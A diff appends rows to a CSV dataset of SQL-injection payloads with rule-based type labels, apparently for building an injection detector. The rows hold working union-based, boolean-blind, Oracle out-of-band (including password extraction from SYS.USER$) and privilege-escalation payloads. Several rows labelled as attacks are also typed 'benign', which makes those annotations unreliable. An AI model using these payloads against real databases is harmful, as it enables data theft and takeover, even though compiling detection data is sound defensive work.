@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+480,password:*/ = 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+481,"select * from users where id = 1 <@. union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @. union select detected — union_based injection (priority 7) on generic",rule-based
+482,"select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+483,"select * from users where id = '1' union select @ @1,version ( ) -- 1'",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+484,"union ( select NULL, ( select @@version ) ) --",1,,union_based,mysql,0.95,union ( select detected — union_based injection (priority 7) on mysql,rule-based
+485,"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+486,"select * from users where id = 1.<@. union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @. union select detected — union_based injection (priority 7) on generic",rule-based
+487,"select * from users where id = 1 +\. union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+488,"select * from users where id = 1 + @<@. union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@. union select detected — union_based injection (priority 7) on generic",rule-based
+489,"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+490,"select * from users where id = 1 or ( $+ ) = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+491,"select * from users where id = 1 + ( \+ ) union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+492,"select * from users where id = 1. union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+493,"select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+494,"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+495,AND 1 = utl_inaddr.get_host_address ( ( SELECT banner FROM v$version WHERE ROWNUM = 1 ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+496,select * from users where id = 1 <@$_ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+497,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+498,"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+499,"select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+500,"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+501,"select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+502,UNION SELECT,1,,union_based,generic,0.85,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
+503,asc,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+504,"|| myappadmin.adduser ( 'admin', 'newpass' ) || '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+505,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,,rce,generic,0.95,sp_ detected — rce injection (priority 1) on generic,rule-based
+506,"select * from users where id = 1 or ( \ ) = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+507,) or true--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+508,"select * from users where id = 1 + ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+509,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
